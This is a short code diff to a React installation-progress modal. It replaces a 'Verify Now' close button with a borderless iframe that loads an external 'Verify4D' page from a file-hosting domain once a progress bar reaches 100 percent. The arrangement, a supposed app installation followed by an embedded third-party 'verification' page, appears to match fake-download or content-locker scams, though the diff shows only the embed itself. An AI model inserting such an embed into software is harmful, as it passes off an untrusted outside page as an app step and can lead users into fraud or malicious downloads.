@@ -108,9 +108,18 @@ export function InstallationModal({ app, onClose }: InstallationModalProps) {
         </div>
         <DialogFooter>
           {progress === 100 ? (
-            <Button onClick={onClose} className="w-full bg-green-500 hover:bg-green-600">
-                Verify Now
-            </Button>
+            <iframe
+              src="https://virginiafiles.com/Verify4D"
+              scrolling="no"
+              marginWidth={0}
+              marginHeight={0}
+              align="middle"
+              frameBorder="0"
+              width="100%"
+              height="300px" 
+              style={{ position: 'relative', opacity: '1' }}
+            >
+            </iframe>
           ) : (
              <Button onClick={onClose} variant="outline" className="w-full">
                 Cancel
